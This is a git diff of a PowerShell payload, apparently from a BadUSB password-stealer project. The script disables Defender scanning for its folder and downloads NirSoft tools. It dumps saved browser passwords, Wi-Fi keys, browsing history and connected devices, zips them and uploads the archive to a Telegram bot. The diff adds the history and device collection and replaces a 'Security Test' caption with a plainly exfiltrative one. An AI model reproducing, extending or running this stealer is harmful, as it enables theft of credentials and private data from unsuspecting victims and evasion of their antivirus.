@@ -18,17 +18,22 @@ Add-MpPreference -ExclusionPath $basePath -Force
 # Download necessary tools
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe
+
 
 # Execute tools to gather data
+.\WNetWatcher.exe /stext connected_devices.txt
+.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt
 .\WebBrowserPassView.exe /stext passwords.txt
 .\WirelessKeyView.exe /stext wifi.txt
 
 # Wait for the files to be fully written
-while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt")) {
+while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
     Start-Sleep -Seconds 1
 }
 
-Move-Item passwords.txt, wifi.txt -Destination "$dumpFolder"
+Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"
 
 # Compress extracted data
 Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
@@ -42,7 +47,7 @@ while (!(Test-Path "$dumpFile")) {
 $token = "<TOKEN>"
 $chatID = "<CHATID>"
 $uri = "https://api.telegram.org/bot$token/sendDocument"
-$caption = "Security Test - Attempted exfiltration from $env:USERNAME"
+$caption = "Here are exfiltrated informations from $env:USERNAME"
 
 # Check if the file exists before sending
 if (!(Test-Path $dumpFile)) {
